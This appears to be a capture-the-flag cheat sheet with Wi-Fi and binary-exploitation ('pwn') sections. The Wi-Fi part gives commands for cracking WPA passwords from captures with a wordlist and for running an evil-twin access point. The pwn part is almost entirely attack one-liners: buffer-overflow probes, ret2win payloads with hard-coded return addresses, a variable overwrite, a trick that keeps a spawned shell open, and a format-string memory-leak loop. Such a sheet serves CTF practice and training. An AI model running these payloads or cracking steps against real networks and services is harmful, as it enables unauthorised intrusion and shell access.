# ======================= WI-FI =======================
# SSID = network NAME, e.g. Canteen-Guest (case-sensitive, goes after -e; quote if it has spaces: -e 'Free WiFi')
# MAC/BSSID = hardware address, 6 hex pairs, e.g. 00:1b:54:7f:82:10 (goes after -b AP, -c client, -v victim; NEVER after -e)
# -p = the real password from the question, not the word PASS. Open network: leave -p out.
# Don't know the SSID? run survey first.
bash wifi_ctf.sh survey -f FILE
bash wifi_ctf.sh assoc -f FILE -c 00:21:6a:8e:3c:51
bash wifi_ctf.sh crack -f FILE -w wordlist.txt -e SSID -r 'ehCTF\{[^}]*\}'
bash wifi_ctf.sh crack -f FILE -e SSID -p 'PASS' -r 'ehCTF\{[^}]*\}'
# KEK / KCK / PMK questions: crack mode prints them after cracking (also saved in crack_NAME/keys.txt). Standalone:

bash wifi_ctf.sh twin -f FILE -e SSID -p 'PASS'
bash wifi_ctf.sh twin -f FILE -e SSID -p 'PASS' -v 02:85:9a:4c:17:b6
# example (practice range): bash wifi_ctf.sh twin -f evil-twin.pcap -e Canteen-Guest -p 'KopiO2026CanteenGuest'

# ======================= PWN (by hand) =======================
# 3 probes: normal / crash = overflow / hex back = format string
nc IP PORT
python3 -c 'print("A"*200)' | nc IP PORT
python3 -c 'print("%p."*20)' | nc IP PORT

# look at the binary
file chall
checksec --file=chall
nm chall | grep -iE 'win|flag|backdoor|shell'
cat chall.c

# variable overwrite (buffer 32 + value from the source)
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*32 + (0x1337c0de).to_bytes(4,"little") + b"\n")' | nc IP PORT

# ret2win 64-bit (offset = buffer + 8; crashes at win? use win+1)
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*40 + (0x401186).to_bytes(8,"little") + b"\n")' | nc IP PORT

# ret2win 32-bit (4-byte address)
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*32 + (0x80491d6).to_bytes(4,"little") + b"\n")' | nc IP PORT

# strcmp "simple buffer"
python3 -c 'print("A"*16 + "impossible?")' | nc IP PORT

# keep the shell open after the payload
(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*40 + (0x401186).to_bytes(8,"little") + b"\n")'; cat) | nc IP PORT

# format string: one position per connection, then decode leak.txt (python snippet in pwn_cheatsheet)
for i in $(seq 1 60); do printf '%%%d$p\n' $i | nc -q1 IP PORT; done > leak.txt
python3 -c 'print("%7$s")' | nc IP PORT
